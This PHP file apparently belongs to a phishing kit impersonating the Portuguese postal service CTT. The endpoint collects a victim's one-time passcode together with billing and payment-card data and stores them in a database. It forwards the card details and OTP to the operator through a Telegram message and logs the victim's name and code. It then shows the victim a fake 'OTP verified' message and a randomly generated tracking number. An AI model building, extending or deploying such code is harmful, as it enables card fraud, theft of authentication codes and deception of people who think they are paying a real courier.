<?php
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit;
}

require_once '../config/database.php';
require_once '../config/telegram.php';

try {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['otp_code']) || !isset($input['billing_data']) || !isset($input['card_data'])) {
        throw new Exception('Invalid input data');
    }
    
    $otpCode = $input['otp_code'];
    $billingData = $input['billing_data'];
    $cardData = $input['card_data'];
    
    $db = new Database();
    
    // Find the session based on billing data (since we don't have session_id in the request)
    $findSessionSql = "SELECT session_id FROM billing_data 
                       WHERE nome = :nome AND telefone = :telefone 
                       ORDER BY created_at DESC LIMIT 1";
    
    $sessionResult = $db->fetchOne($findSessionSql, [
        ':nome' => $billingData['nome'],
        ':telefone' => $billingData['telefone']
    ]);
    
    if (!$sessionResult) {
        // Create a new session if not found
        $sessionId = 'CTT' . str_pad(rand(10000000, 99999999), 8, '0', STR_PAD_LEFT);
    } else {
        $sessionId = $sessionResult['session_id'];
    }
    
    // Generate tracking number
    $trackingNumber = 'RR' . str_pad(rand(100000000, 999999999), 9, '0', STR_PAD_LEFT) . 'PT';
    
    // Store OTP data
    $otpSql = "INSERT INTO otp_data (session_id, otp_code, tracking_number) 
               VALUES (:session_id, :otp_code, :tracking_number)";
    
    $otpParams = [
        ':session_id' => $sessionId,
        ':otp_code' => $otpCode,
        ':tracking_number' => $trackingNumber
    ];
    
    $otpResult = $db->query($otpSql, $otpParams);
    if (!$otpResult) {
        throw new Exception('Failed to store OTP data');
    }
    
    // Send second Telegram message (OTP verification)
    $telegram = new TelegramService();
    $telegramSent = $telegram->sendOtpVerifiedMessage($billingData, $cardData, $otpCode);
    
    error_log("OTP submitted for {$billingData['nome']} - OTP: $otpCode");
    
    echo json_encode([
        'status' => 'success',
        'message' => 'OTP verificado com sucesso',
        'tracking_number' => $trackingNumber,
        'session_id' => $sessionId,
        'telegram_sent' => $telegramSent
    ]);
    
} catch (Exception $e) {
    error_log("Error in otp-verify.php: " . $e->getMessage());
    http_response_code(500);
    echo json_encode([
        'status' => 'error',
        'message' => $e->getMessage()
    ]);
}
?>